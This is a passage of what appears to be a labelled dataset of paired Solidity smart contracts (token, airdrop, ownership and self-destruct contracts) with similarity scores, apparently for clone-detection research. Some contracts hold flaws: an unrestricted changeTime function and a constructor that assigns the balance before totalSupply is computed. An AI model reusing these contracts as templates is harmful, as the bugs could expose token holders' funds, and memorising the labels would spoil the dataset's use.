        balances[_participant] = balances[_participant].add(_amount);

        totalDistributed = totalDistributed.add(_amount);



        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }



        

        emit Airdrop(_participant, _amount, balances[_participant]);

        emit Transfer(address(0), _participant, _amount);

    }



    function adminClaimAirdrop(address _participant, uint _amount) public onlyOwner {        

        doAirdrop(_participant, _amount);

    }



    function adminClaimAirdropMultiple(address[] _addresses, uint _amount) public onlyOwner {        

        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);

    }



    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        

        tokensPerEth = _tokensPerEth;

        emit TokensPerEthUpdated(_tokensPerEth);

    }

           

    function () external payable {

        getTokens();

     }

    

    function getTokens() payable canDistr  public {

        uint256 tokens = 0;



        

        require( msg.value >= MIN_CONTRIBUTION );



        require( msg.value > 0 );



        

        tokens = tokensPerEth.mul(msg.value) / 0.01 ether;        

        address investor = msg.sender;

        

        if (tokens > 0) {

            distr(investor, tokens);

        }



        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

    }



    function balanceOf(address _owner) constant public returns (uint256) {

        return balances[_owner];

    }



    

    modifier onlyPayloadSize(uint size) {

        assert(msg.data.length >= size + 4);

        _;

    }

    

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[msg.sender]);

        

        balances[msg.sender] = balances[msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(msg.sender, _to, _amount);

        return true;

    }

    

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[_from]);

        require(_amount <= allowed[_from][msg.sender]);

        

        balances[_from] = balances[_from].sub(_amount);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(_from, _to, _amount);

        return true;

    }

    

    function approve(address _spender, uint256 _value) public returns (bool success) {

        

        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }

    

    function allowance(address _owner, address _spender) constant public returns (uint256) {

        return allowed[_owner][_spender];

    }

    

    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){

        ForeignToken t = ForeignToken(tokenAddress);

        uint bal = t.balanceOf(who);

        return bal;

    }

    

    function withdraw() onlyOwner public {

        address myAddress = this;

        uint256 etherBalance = myAddress.balance;

        owner.transfer(etherBalance);

    }

    

    function burn(uint256 _value) onlyOwner public {

        require(_value <= balances[msg.sender]);

        

        



        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);

        totalSupply = totalSupply.sub(_value);

        totalDistributed = totalDistributed.sub(_value);

        emit Burn(burner, _value);

    }

    

    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {

        ForeignToken token = ForeignToken(_tokenContract);

        uint256 amount = token.balanceOf(address(this));

        return token.transfer(owner, amount);

    }

}",0,,,,,
"contract Mortal {
   address owner;

   function Mortal() public { owner = msg.sender; }

   function kill() public { if (msg.sender == owner) selfdestruct(owner); }
}",0.902946233,"contract Mortal {

    

    address owner;



    

    constructor() public { owner = msg.sender; }



    

    function kill() public { if (msg.sender == owner) selfdestruct(owner); }

}",0,,,,,
"contract WBC_TOKEN is StandardToken {
  string public name    = ""WBC TOKEN"";
  string public symbol  = ""WBC"";
  uint8 public decimals = 18;
  uint256 public constant INITIAL_SUPPLY = 200000000;
  event Burn(address indexed _from, uint256 _tokenDestroyed, uint256 _timestamp);

  function WBC_TOKEN() public {
    totalSupply_ = INITIAL_SUPPLY * (10 ** uint256(decimals));
    balances[msg.sender] = totalSupply_;
  }

  function burn(uint256 _burntAmount) public returns (bool success) {
    require(balances[msg.sender] >= _burntAmount && _burntAmount > 0);
    balances[msg.sender] = balances[msg.sender].sub(_burntAmount);
    totalSupply_ = totalSupply_.sub(_burntAmount);
    emit Transfer(address(this), 0x0, _burntAmount);
    emit Burn(msg.sender, _burntAmount, block.timestamp);
    return true;
  }
}",0.956531132,"contract HTCToken is StandardToken{
  string public name    = ""HTC"";
  string public symbol  = ""HTC"";
  uint8 public decimals = 18;
  uint256 public constant INITIAL_SUPPLY = 10000000000;
  event Burn(address indexed _from, uint256 _tokenDestroyed, uint256 _timestamp);

  function HTCToken() public {
    totalSupply_ = INITIAL_SUPPLY * (10 ** uint256(decimals));
    balances[msg.sender] = totalSupply_;
  }

  function burn(uint256 _burntAmount) public returns (bool success) {
    require(balances[msg.sender] >= _burntAmount && _burntAmount > 0);
    balances[msg.sender] = balances[msg.sender].sub(_burntAmount);
    totalSupply_ = totalSupply_.sub(_burntAmount);
    emit Transfer(address(this), 0x0, _burntAmount);
    emit Burn(msg.sender, _burntAmount, block.timestamp);
    return true;
  }
}",0,,,,,
"contract Owned {

    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
}",0.965494015,"contract Ownable {

  address public owner;



  constructor() public {

    owner = msg.sender;

  }



  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }

}",0,,,,,
"contract TokenERC20 {
    
    string public name;
    string public symbol;
    uint8 public decimals;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol,
        uint8 dividetoken
    ) public {

        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = dividetoken;
        totalSupply = initialSupply * 10 ** uint256(decimals);  
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",0.987152988,"contract TokenERC20 {
    
    string public name;
    string public symbol;
    uint8 public decimals;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol,
        uint8 decimalPalces
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimalPalces);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalPalces;
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);        
        require(balanceOf[_from] >= _value);        
        require(balanceOf[_to] + _value > balanceOf[_to]);        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];        
        balanceOf[_from] -= _value;        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success)
    {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",0,,,,,
"contract MyToken {

    string public name;
    string public symbol;
    uint8 public decimals;
    
    mapping (address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    
    function MyToken(uint256 initialSupply, string tokenName, uint8 decimalUnits, string tokenSymbol) {
        balanceOf[msg.sender] = initialSupply;              
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
    }

    function transfer(address _to, uint256 _value) {
        
        if (balanceOf[msg.sender] < _value || balanceOf[_to] + _value < balanceOf[_to])
            throw;

        
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        
        Transfer(msg.sender, _to, _value);
    }
}",0.951635104,"contract JCFv1 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    string public name;
    string public symbol;
    uint8 public decimals;
    
    mapping (address => uint256) public balanceOf;
    
    
    function JCFv1(uint256 initialSupply, string tokenName, string tokenSymbol, uint8 decimalUnits) public {
        balanceOf[msg.sender] = initialSupply;              
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
    }
    
    
    function transfer(address _to, uint256 _value) public {
        
        require(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);

        
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        
        
        Transfer(msg.sender, _to, _value);
    }
}",0,,,,,
"contract RS1 {
    
    string public name;
    string public symbol;
    uint8 public decimals = 0;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function RS1(
    ) public {
        totalSupply = 100000;  
        balanceOf[msg.sender] = totalSupply;                
        name = ""RS1"";                                   
        symbol = ""RS1"";                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",0.974737279,"contract TokenTKC {
    
    string public name = ""iTech Token"";
    string public symbol = ""TKC"";
    uint256 public decimals = 18;
    
    uint256 public totalSupply = 100*1000*1000*(10**decimals);

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function TokenTKC(
    ) public {
        balanceOf[msg.sender] = totalSupply;                
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",1,*,,,,
"contract AramCoin {
    
    mapping (address => uint256) public balanceOf;
    string public name;
    string public symbol;
    uint8 public decimals;

    
    function AramCoin(uint256 initialSupply, string tokenName, uint8 decimalUnits, string tokenSymbol) {
        balanceOf[msg.sender] = initialSupply;              
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
    }

    
    function transfer(address _to, uint256 _value) 
    {
        if (balanceOf[msg.sender] < _value) 
            throw;           

        if (balanceOf[_to] + _value < balanceOf[_to]) 
            throw; 

        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            

        
        Transfer(msg.sender, _to, _value);

    }

    event Transfer(address indexed from, address indexed to, uint256 value);

}",0.924548725,"contract TheCoinBBToken {

    

    string public name;

    

    string public symbol;

    

    uint public decimals;



    

    event Transfer(address indexed from, address indexed to, uint256 value);



    

    mapping(address => uint256) public balanceOf;





    

    function TheCoinBBToken(uint256 initialSupply,string tokenName, string tokenSymbol, uint8 decimalUnits) public {

        

        balanceOf[msg.sender] = initialSupply;

        name = tokenName;                                 

        symbol = tokenSymbol;                               

        decimals = decimalUnits; 

    }



    

    function transfer(address _to,uint256 _value) public {

        

        require(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);

        balanceOf[msg.sender] -= _value;

        balanceOf[_to] += _value;

        

        Transfer(msg.sender, _to, _value);

    }



}",1,,,,,
"contract GorillaToken is MintableToken {

  string public constant name = ""Gorilla Token"";
  string public constant symbol = ""GRL"";
  uint8 public constant decimals = 4;

}",0.904936488,"contract GturboToken is MintableToken {

  string public constant name = ""GTurbo Token"";
  string public constant symbol = ""GTR"";
  uint8 public constant decimals = 18;

}",1,,,,,
"contract Coursetro {

   string fName;
   uint age;

   function setInstructor(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
   }

   function getInstructor() private constant returns (string, uint) {
       return (fName, age);
   }

}",0.972652965,"contract Coursetro {
    
   string fName;
   uint age;
   
   function setInstructor(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
   }
   
   function getInstructor() public constant returns (string, uint) {
       return (fName, age);
   }
    
}",3,*,,,,
"contract AnotherCoin {

    string public constant name = ""AnotherCoin"";
    string public constant symbol = ""ATC"";
    uint8 public constant decimals = 3;  


    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    event Transfer(address indexed from, address indexed to, uint tokens);


    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;

    uint256 totalSupply_;

    using SafeMath for uint256;


    constructor(uint256 total) public {  
        totalSupply_ = total;
        balances[msg.sender] = totalSupply_;
    }  

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address tokenOwner) public view returns (uint) {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint numTokens) public returns (bool) {
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(numTokens);
        balances[receiver] = balances[receiver].add(numTokens);
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function approve(address delegate, uint numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint) {
        return allowed[owner][delegate];
    }

    function transferFrom(address owner, address buyer, uint numTokens) public payable returns (bool) {
        require(numTokens <= balances[owner]);    
        require(numTokens <= allowed[owner][msg.sender]);

        balances[owner] = balances[owner].sub(numTokens);
        allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens);
        balances[buyer] = balances[buyer].add(numTokens);
        emit Transfer(owner, buyer, numTokens);
        return true;
    }
}",0.971971395,"contract Silling {

    string public constant name = ""SILLING"";
    string public constant symbol = ""SLN"";
    uint8 public constant decimals = 18;  


    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    event Transfer(address indexed from, address indexed to, uint tokens);


    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;
    
    uint256 totalSupply_;

    using SafeMath for uint256;


   constructor() public {  
	totalSupply_ = 500000000 * 10 ** uint256(decimals);
	balances[msg.sender] = totalSupply_;
    }  

    function totalSupply() public view returns (uint256) {
	return totalSupply_;
    }
    
    function balanceOf(address tokenOwner) public view returns (uint) {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint numTokens) public returns (bool) {
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(numTokens);
        balances[receiver] = balances[receiver].add(numTokens);
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function approve(address delegate, uint numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint) {
        return allowed[owner][delegate];
    }

    function transferFrom(address owner, address buyer, uint numTokens) public returns (bool) {
        require(numTokens <= balances[owner]);    
        require(numTokens <= allowed[owner][msg.sender]);
    
        balances[owner] = balances[owner].sub(numTokens);
        allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens);
        balances[buyer] = balances[buyer].add(numTokens);
        emit Transfer(owner, buyer, numTokens);
        return true;
    }
}",1,,,,,
"contract ERC20 {
    uint256 public totalSupply;

    bool public transfersEnabled;

    function balanceOf(address _owner) public constant returns (uint256 balance);

    function transfer(address _to, uint256 _value) public returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    function approve(address _spender, uint256 _value) public returns (bool success);

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",0.943974261,"contract Erc20

{   

    

    function totalSupply() public view returns (uint256 amount);

    function balanceOf(address owner) public view returns (uint256 balance);

    function transfer(address to, uint256 value) public returns (bool success);

    function transferFrom(address from, address to, uint256 value) public returns (bool success);

    function approve(address spender, uint256 value) public returns (bool success);

    function allowance(address owner, address spender) public view returns (uint256 remaining);

    

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}",1,,,,,
"contract ERC223ReceivingContract {
    
    function tokenFallback(address _from, uint _value, bytes _data) public;
}",0.904163792,"contract ERC223ReceivingContract {

    function tokenFallback(address _from, uint256 _value, bytes _data);

}",1,,,,,
"contract Saxotoken is StandardToken {

    string public constant name = ""SaxoToken"";
    string public constant symbol = ""SAXO"";
    uint8 public constant decimals = 18;
    uint256 public constant INITIAL_SUPPLY = 30 * 10**9 * (10**uint256(decimals));
    address public owner;
    mapping (address => bool) public contractUsers;
    bool public mintingFinished;
    uint256 public tokenAllocated = 0;
    
    mapping (address => uint) public countClaimsToken;

    uint256 public priceToken = 1500000;
    uint256 public priceClaim = 0.001 ether;
    uint256 public numberClaimToken = 5000 * (10**uint256(decimals));
    uint256 public startTimeDay = 43200;
    uint256 public endTimeDay = 64800;

    event OwnerChanged(address indexed previousOwner, address indexed newOwner);
    event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
    event TokenLimitReached(uint256 tokenRaised, uint256 purchasedToken);
    event MinWeiLimitReached(address indexed sender, uint256 weiAmount);
    event Mint(address indexed to, uint256 amount);
    event MintFinished();

    constructor(address _owner) public {
        totalSupply = INITIAL_SUPPLY;
        owner = _owner;
        
        balances[owner] = INITIAL_SUPPLY;
        transfersEnabled = true;
        mintingFinished = false;
    }

    
    function() payable public {
        buyTokens(msg.sender);
    }

    function buyTokens(address _investor) public payable returns (uint256){
        require(_investor != address(0));
        uint256 weiAmount = msg.value;
        uint256 tokens = validPurchaseTokens(weiAmount);
        if (tokens == 0) {revert();}
        tokenAllocated = tokenAllocated.add(tokens);
        mint(_investor, tokens, owner);

        emit TokenPurchase(_investor, weiAmount, tokens);
        owner.transfer(weiAmount);
        return tokens;
    }

    function validPurchaseTokens(uint256 _weiAmount) public returns (uint256) {
        uint256 addTokens = _weiAmount.mul(priceToken);
        if (_weiAmount < 0.01 ether) {
            emit MinWeiLimitReached(msg.sender, _weiAmount);
            return 0;
        }
        if (tokenAllocated.add(addTokens) > balances[owner]) {
            emit TokenLimitReached(tokenAllocated, addTokens);
            return 0;
        }
        return addTokens;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    modifier canMint() {
        require(!mintingFinished);
        _;
    }

    
    function finishMinting() onlyOwner canMint public returns (bool) {
        mintingFinished = true;
        emit MintFinished();
        return true;
    }

    function changeOwner(address _newOwner) onlyOwner public returns (bool){
        require(_newOwner != address(0));
        emit OwnerChanged(owner, _newOwner);
        owner = _newOwner;
        return true;
    }

    function enableTransfers(bool _transfersEnabled) onlyOwner public {
        transfersEnabled = _transfersEnabled;
    }

    
    function mint(address _to, uint256 _amount, address _owner) canMint internal returns (bool) {
        require(_to != address(0));
        require(_amount <= balances[owner]);
        require(!mintingFinished);
        balances[_to] = balances[_to].add(_amount);
        balances[_owner] = balances[_owner].sub(_amount);
        emit Mint(_to, _amount);
        emit Transfer(_owner, _to, _amount);
        return true;
    }

    function claim() canMint public payable returns (bool) {
        uint256 currentTime = now;
        
        require(validPurchaseTime(currentTime));
        require(msg.value >= priceClaim);
        address beneficiar = msg.sender;
        require(beneficiar != address(0));
        require(!mintingFinished);

        uint256 amount = calcAmount(beneficiar);
        require(amount <= balances[owner]);

        balances[beneficiar] = balances[beneficiar].add(amount);
        balances[owner] = balances[owner].sub(amount);
        tokenAllocated = tokenAllocated.add(amount);
        owner.transfer(msg.value);
        emit Mint(beneficiar, amount);
        emit Transfer(owner, beneficiar, amount);
        return true;
    }

    
    function calcAmount(address _beneficiar) canMint internal returns (uint256 amount) {
        if (countClaimsToken[_beneficiar] == 0) {
            countClaimsToken[_beneficiar] = 1;
        }
        if (countClaimsToken[_beneficiar] >= 22) {
            return 0;
        }
        uint step = countClaimsToken[_beneficiar];
        amount = numberClaimToken.mul(105 - 5*step).div(100);
        countClaimsToken[_beneficiar] = countClaimsToken[_beneficiar].add(1);
    }

    function validPurchaseTime(uint256 _currentTime) canMint public view returns (bool) {
        uint256 dayTime = _currentTime % 1 days;
        if (startTimeDay <= dayTime && dayTime <=  endTimeDay) {
            return true;
        }
        return false;
    }

    function changeTime(uint256 _newStartTimeDay, uint256 _newEndTimeDay) public {
        require(0 < _newStartTimeDay && 0 < _newEndTimeDay);
        startTimeDay = _newStartTimeDay;
        endTimeDay = _newEndTimeDay;
    }

    
    function claimTokensToOwner(address _token) public onlyOwner {
        if (_token == 0x0) {
            owner.transfer(address(this).balance);
            return;
        }
        Saxotoken token = Saxotoken(_token);
        uint256 balance = token.balanceOf(this);
        token.transfer(owner, balance);
        emit Transfer(_token, owner, balance);
    }

    function setPriceClaim(uint256 _newPriceClaim) external onlyOwner {
        require(_newPriceClaim > 0);
        priceClaim = _newPriceClaim;
    }

    function setNumberClaimToken(uint256 _newNumClaimToken) external onlyOwner {
        require(_newNumClaimToken > 0);
        numberClaimToken = _newNumClaimToken;
    }

}",0.987846098,"contract TaurusPay is StandardToken {



    string public constant name = ""TaurusPay"";

    string public constant symbol = ""TAPT"";

    uint8 public constant decimals = 18;

    uint256 public constant INITIAL_SUPPLY = 950 * 10**6 * (10**uint256(decimals));

    address public owner;

    mapping (address => bool) public contractUsers;

    bool public mintingFinished;

    uint256 public tokenAllocated = 0;

    

    mapping (address => uint) public countClaimsToken;



    uint256 public priceToken = 950000;

    uint256 public priceClaim = 0.0005 ether;

    uint256 public numberClaimToken = 200 * (10**uint256(decimals));

    uint256 public startTimeDay = 50400;

    uint256 public endTimeDay = 51300;



    event OwnerChanged(address indexed previousOwner, address indexed newOwner);

    event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);

    event TokenLimitReached(uint256 tokenRaised, uint256 purchasedToken);

    event MinWeiLimitReached(address indexed sender, uint256 weiAmount);

    event Mint(address indexed to, uint256 amount);

    event MintFinished();



    constructor(address _owner) public {

        totalSupply = INITIAL_SUPPLY;

        owner = _owner;

        

        balances[owner] = INITIAL_SUPPLY;

        transfersEnabled = true;

        mintingFinished = false;

    }



    

    function() payable public {

        buyTokens(msg.sender);

    }



    function buyTokens(address _investor) public payable returns (uint256){

        require(_investor != address(0));

        uint256 weiAmount = msg.value;

        uint256 tokens = validPurchaseTokens(weiAmount);

        if (tokens == 0) {revert();}

        tokenAllocated = tokenAllocated.add(tokens);

        mint(_investor, tokens, owner);



        emit TokenPurchase(_investor, weiAmount, tokens);

        owner.transfer(weiAmount);

        return tokens;

    }



    function validPurchaseTokens(uint256 _weiAmount) public returns (uint256) {

        uint256 addTokens = _weiAmount.mul(priceToken);

        if (_weiAmount < 0.01 ether) {

            emit MinWeiLimitReached(msg.sender, _weiAmount);

            return 0;

        }

        if (tokenAllocated.add(addTokens) > balances[owner]) {

            emit TokenLimitReached(tokenAllocated, addTokens);

            return 0;

        }

        return addTokens;

    }



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    modifier canMint() {

        require(!mintingFinished);

        _;

    }



    

    function finishMinting() onlyOwner canMint public returns (bool) {

        mintingFinished = true;

        emit MintFinished();

        return true;

    }



    function changeOwner(address _newOwner) onlyOwner public returns (bool){

        require(_newOwner != address(0));

        emit OwnerChanged(owner, _newOwner);

        owner = _newOwner;

        return true;

    }



    function enableTransfers(bool _transfersEnabled) onlyOwner public {

        transfersEnabled = _transfersEnabled;

    }



    

    function mint(address _to, uint256 _amount, address _owner) canMint internal returns (bool) {

        require(_to != address(0));

        require(_amount <= balances[owner]);

        require(!mintingFinished);

        balances[_to] = balances[_to].add(_amount);

        balances[_owner] = balances[_owner].sub(_amount);

        emit Mint(_to, _amount);

        emit Transfer(_owner, _to, _amount);

        return true;

    }



    function claim() canMint public payable returns (bool) {

        uint256 currentTime = now;

        

        require(validPurchaseTime(currentTime));

        require(msg.value >= priceClaim);

        address beneficiar = msg.sender;

        require(beneficiar != address(0));

        require(!mintingFinished);



        uint256 amount = calcAmount(beneficiar);

        require(amount <= balances[owner]);



        balances[beneficiar] = balances[beneficiar].add(amount);

        balances[owner] = balances[owner].sub(amount);

        tokenAllocated = tokenAllocated.add(amount);

        owner.transfer(msg.value);

        emit Mint(beneficiar, amount);

        emit Transfer(owner, beneficiar, amount);

        return true;

    }



    

    function calcAmount(address _beneficiar) canMint internal returns (uint256 amount) {

        if (countClaimsToken[_beneficiar] == 0) {

            countClaimsToken[_beneficiar] = 1;

        }

        if (countClaimsToken[_beneficiar] >= 22) {

            return 0;

        }

        uint step = countClaimsToken[_beneficiar];

        amount = numberClaimToken.mul(105 - 5*step).div(100);

        countClaimsToken[_beneficiar] = countClaimsToken[_beneficiar].add(1);

    }



    function validPurchaseTime(uint256 _currentTime) canMint public view returns (bool) {

        uint256 dayTime = _currentTime % 1 days;

